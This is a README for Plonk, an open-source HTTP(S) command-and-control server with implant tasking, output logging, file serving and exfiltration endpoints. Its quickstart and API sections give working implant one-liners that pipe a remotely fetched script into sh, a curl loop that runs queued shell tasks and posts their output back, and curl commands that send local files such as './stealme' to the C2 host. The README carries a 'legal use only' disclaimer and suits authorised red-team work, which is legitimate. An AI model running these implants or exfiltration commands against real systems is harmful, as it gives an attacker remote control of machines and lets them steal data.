Plonk HTTP C2 and Static File Server
====================================
Plonk is a little HTTP(s) server program you can just plonk down and use for
quick'n'dirty C2ish infrastructure.  It serves static file and can serve
rudimentary tasking and take output.

For legal use only.

Quickstart
----------
1. Start the C2 server
```bash
# Build the server.  Alternatively, get hold af an already-built binary.
go install github.com/magisterquis/plonk@latest

# Plonk listen on port 443 by default.  On Linux, capabilities allow it to run
# as a normal user.
[[ "Linux" == "$(uname -s)" ]] && sudo setcap cap_net_bind_service+eip "$(which plonk)"

# Start the server
plonk -h
plonk -letsencrypt c2domain.example.com
```
2. Get an implant going on target
```bash
curl -s https://c2domain.example.com/c | sh
```
_...or..._
```bash
while :; do
        curl -s https://c2domain.example.com/t/kittens |
        /bin/sh 2>&1 |
        curl --data-binary @- -s https://c2domain.example.com/o/kittens
        
        sleep 15
done
```
3. Tasking and output
```
$ plonk -interact -next- # Or an implant ID
2023/05/23 22:20:14 Welcome.  Going interactive with kittens.
uname -a
2023/05/23 22:21:10 [TASKQ] Added task (queue length 1):
uname -a
2023/05/23 22:21:34 [CALLBACK] Sent task "uname -a"
2023/05/23 22:21:35 [OUTPUT]
OpenBSD c2.example.com 7.2 GENERIC#728 amd64
```

Features
--------
- HTTP
- HTTPS with (in order of preference)
  - Automatic certificate provisioning with Let's Encrypt
  - Easy usage of custom certificates
  - Self-signed certificate generation
- Static file server
- Tasking over HTTP(s)
- Task output logging over HTTP(s)
- Exfil sent over HTTP(s) saved to files
- Simple interactive interface
- Implant script generation

Installation
------------
With a [typical Go installation](https://golang.org/...):
```sh
go install github.com/magisterquis/plonk@latest
```

Alternatively, Plonk for several architectures may be built with
[`build.sh`](./build.sh).

The [Makefile](./Makefile) will build Plonk for the current architecture or
`$GOOS`/`$GOARCH`, as appropriate.  It is provided to accommodate muscle
memory.

Tasking and Output
------------------
Tasking is queued in a JSON object in `plonk.d/tasking`, usually either by
somthing like `plonk -task kittens "id && uname -a"` for one-off taskig or
`plonk -interact kittens` for interactive operations.  Implants retrieve
tasking with HTTP requets to `/t/<ImplantID>`, one tasking per query.

Output is sent back in HTTP requests to `/o/<ImplantID>` and will be logged
in `plonk.d/log`.  Output will be parsed out of the log and printed nicely
when using `plonk -interact`.

The ImplantID `-` is used for implants which don't actually send an
`<ImplantID>`.  The ImplantID `-next-` can be used to wait for and then task or
interact with the implant with the next logged callback.  If `-verbose` isn't
used, sending SIGHUP to the server process will cause previously-logged
ImplantIDs to be logged again.

Static And Default Files
------------------------
Static files placed in `plonk.d/files` will be served under the path `/f`, e.g.
a request for `https://example.com/f/tools/implant` will return
`plonk.d/files/tools/implant`.

Requests for unexpected paths (i.e. not in the table below) will be served
a static file, `plonk.d/index.html`.

Exfil
-----
The bodies of HTTP requets to `/p` will be saved to files in `plonk.d/exfil`.
This is useful for situations in which output is too big or cumbersome to be
saved to the log or printed interactively (i.e. with `/o`).  The HTTP body
will be saved as-is.  If a multipart form is sent, the multipart form headers
will alse be saved.  This can be handy for also saving a filename.

The following cURL oneliners can be used to send back exfil to Plonk:
```sh
curl --data-binary @./stealme https://example.com/p/kittens # ./stealme will be saved to plonk.d/exfil
curl -Fa=@./stealme https://example.com/p/kittens           # Saves multipart form headers too
```

By default, at most 100MB is saved per request.  This can be changed with the
`PLONK_EXFILMAX` environment variable.

Saving exfil can be disabled with `-no-exfil`.

Implants
--------
Plonk does not currently have much in the way of canned implants.  The Implant
HTTP API (such as it is) is a follows:

Default Endpoint | [Environment Variable](#Environment-Variables) | Description
-----------------|------------------------------------------------|------------
`/f/<path>`      | `PLONK_FILESPREFIX`/`PLONK_STATICFILESDIR`     | Download a static file
`/t/<ImplantID>` | `PLONK_TASKPREFIX`                             | Retrieve tasking
`/o/<ImplantID>` | `PLONK_OUTPUTPREFIX`                           | Return output
`/p/<ImplantID>` | `PLONX_EXFILPREFIX`/`PLONK_EXFILDIR`           | Save exfil to files
`/c/`            | `PLONK_CLGENPREFIX`                            | Generate a cURL-in-a-loop script

The `/<ImplantID>` above may be omitted for an IDless implant.  To interact
with an IDless implant, `-task -` and `-interact -` may be used.  If more than
one implant doesn't provide an ImplantID, tasking will go to whichever asks
first.

There are also a few low-effort implants in
[`implant_ideas.md`](./implant_ideas.md).

Implant Generation
------------------
A quick-n-dirty, self-backgrounging script which runs cURL in a loop can be
retrieved using the `/c` endpoint.  By default, it becaons every 5 seconds to
the domain presented to Plonk either in the HTTP host header or, failing that
the TLS SNI.

### Request parameters

The following may be set as URL or POST parameters to override script
generation defaults.
Parameter | Example                     | Description
----------|-----------------------------|------------
`c2url`   | `https://example.org:4342"` | Plonk's URL, less any path
`cbint`   | `10m`                       | Beacon interval, rounded down to the nearest second

Example:
```sh
curl -sv https://c2domain.example.com/c?c2url=c2domain.example.com&cbint=1h | sh
```

### C2 URL

The C2 URL may also be sent as a Host header, prefixed with `http-` or
`https-`, useful in calling back with a different protoctol than was used to
grab the script.

Example:
```sh
curl -H 'Host: https-c2domain.example.com' http://dl.example.com | sh
```

### Template

The script is generated from a [template](https://pkg.go.dev/text/template) in
`plonk.d/clgen.tmpl`.  This can be hot-reloaded by sending Plonk a SIGHUP.  The
following parameters are passed to the template:

Parameter   | Example                | Description
------------|------------------------|------------
`.RandN`    | `2aj1vpyx5glqi`        | Random base36 number, for ImplantID generation
`.URL`      | `https://c2domain.com` | C2 URL for `/{t,o}/ImplantID`
`.Interval` | `5`                    | Callback interval, in seconds

Signals
-------
Plonk, in server mode (not with `-task` or `-interact`) listens for two
Signals, SIGHUP and SIGUSR1.

SIGHUP causes the following:
- Tasking file is closed and reopened.  This is useful for after editing it
  by hand.
- Certificates cached in memory are forgotten.  This is useful for manual
  certificate updating with no downtime.
- Seen implants are forgotten.  This is useful for logging the next callback
  of an implant which has already called back without using `-verbose`.
- The cURL-in-a-loop template is re-read from `clgen.tmpl`.

SIGUSR1 causes the following:
- Generated self-signed certificates are written to disk.  This is useful for
  restarting Plonk while an implant which checks a self-signed cert's
  fingerprint is still running.

When using `-interact -next-` or `-task -next-` SIGHUP is silently ignored
while waiting for the next callback to be logged.  This is to make it possible
to `pkill plonk` to force already-known implant IDs to be logged again without
causing the interactive process to terminate.

Usage
-----
```
Usage: plonk [options]

  HTTP(s)-based static file and rudimentary C2 server.

  Upon starting, Plonk will make a directory (-work-dir, currently plonk.d),
  chdir into it, and make other supporting files and directories.  The names of
  these and several other things can be controlled with environment variables,
  listable with -print-env.

  TLS certificates may, in order of preference, be automatically provisioned
  using Let's Encrypt (-letsencrypt*), stored as pairs of
  plonk.d/certs/domain.tld.{crt,key}, or failing that, generated as
  self-signed certificates.

  Do not use -letsencrypt unless you accept Let's Encrypt's Terms of Service.

  Files and directories under plonk.d/files/ will served when Plonk gets a
  request for a path under /f/.

  A quick-n-dirty implant script can be retrieved from /c.  By default, it
  will call back to the protocol, domain, and port from which it was requested.

  C2 tasking is retrieved by a request to /t/<ImplantID>.  The /<ImplantID>
  may be empty; Plonk treats this as an IDless implant.  Tasking is stored in a
  single JSON file (currently plonk.d/tasking.json), which may be updated by
  hand or with -task or -implant, as below.  Plonk doesn't do anything to
  process tasking; whatever it gets it sends directly to the implant.

  Output from implants is sent in an HTTP request body to /o/<ImplantID>, or
  just /o for an IDless implant.

  HTTP verbs for all requests are ignored.  HTTP requests for paths other than
  the above are served a single static file, by default plonk.d/index.html.

  All of the above is logged in plonk.d/log.

  When Plonk gets a SIGHUP, it reopens the taskfile and forgets the self-signed
  certificates it's generated as well as its list of seen implants.  When Plonk
  gets a SIGUSR1, it writes the self-signed certificates it's generated to the
  local certificate directory.

  The first time Plonk is run, it is helpful to use -verbose.

Usage: plonk -task implantID|-|-next- [task...]

  Adds a task for the given implant, or - for the IDless implant.  This
  invocation af Plonk must be run with the same idea of the tasking file
  (currently plonk.d/tasking.json) as the server process.  The implantID may
  also be -next- to automatically select the next implant which calls back.

Usage: plonk -interact implantID|-|-next-

  Interactive(ish) operation.  Given an implant ID (or - for the IDlessimplant)
  it queues as tasking non-blank, non #-prefixed lines it reads on standard
  input and displays relevant logfile lines on standard output.  Probably best
  used with rlwrap.  Like -task, this invocation of Plonk must be run with the
  same idea of the tasking file (currently plonk.d/tasking.json) as well as the
  logfile (currently plonk.d/log). The implantID may also be -next- to
  automatically select the next implant which calls back.

Options:
  -http address
    	HTTP address
  -https address
    	HTTPS address (default "0.0.0.0:443")
  -interact string
    	Interact with the given implant ID, or - for an IDless implant
  -letsencrypt domain
    	Use Let's Encrypt to provision certificates for the given domain (may be repeated)
  -letsencrypt-email address
    	Optional email address to use for Let's Encrypt
  -letsencrypt-staging
    	Use Let's Encrypt's staging server
  -print-env
    	Print the configuration environment variables
  -task ID
    	Queue a task for the given implant ID or - for an IDless implant
  -verbose
    	Log ALL the things
  -whitelist-self-signed domain
    	Allow self-signed cert generation for the given (possibly wildcarded) domain or IP address (may be repeated, default *)
  -work-dir directory
    	Working directory (default "plonk.d")
```

Environment Variables
---------------------
Plonk reads configuration from the following environment variables at runtime:

Variable               | Default        | Description
-----------------------|----------------|------------
`PLONK_DEFAULTFILE`    | `index.html`   | File served for otherwise-unhandled requests
`PLONK_EXFILDIR`       | `exfil`        | Directory to which to save exfil
`PLONK_EXFILMAX`       | `10485760`     | Maximum exfil saved to a file
`PLONK_EXFILPREFIX`    | `p`            | URL path prefix for saving exfil
`PLONK_FILESPREFIX`    | `f`            | URL path prefix for requesting static files
`PLONK_HTTPTIMEOUT`    | `1m`           | HTTP request timeout
`PLONK_LECERTDIR`      | `lecerts`      | Let's Encrypt certificate cache directory
`PLONK_LOCALCERTDIR`   | `certs`        | Locally-configured (non-Let's Encrypt) certificate directory
`PLONK_LOGFILE`        | `log`          | Logfile
`PLONK_OUTPUTMAX`      | `10485760`     | Maximum output read in one request from an Implant
`PLONK_OUTPUTPREFIX`   | `o`            | URL path prefix used by implants to request to send output
`PLONK_STATICFILESDIR` | `files`        | Static files directory
`PLONK_TASKFILE`       | `tasking.json` | Queued tasking file
`PLONK_TASKPREFIX`     | `t`            | URL path prefix used by implants to request tasking
`PLONK_CLGENPREFIX`    | `c`            | URL path prefix for generating a cURL in a loop implant script

The list may also be printed with `-print-env`.

Filenames and directories above are taken as subdirectories of Plonk's working
directory, by default `plonk.d`, unless they're absolute paths.
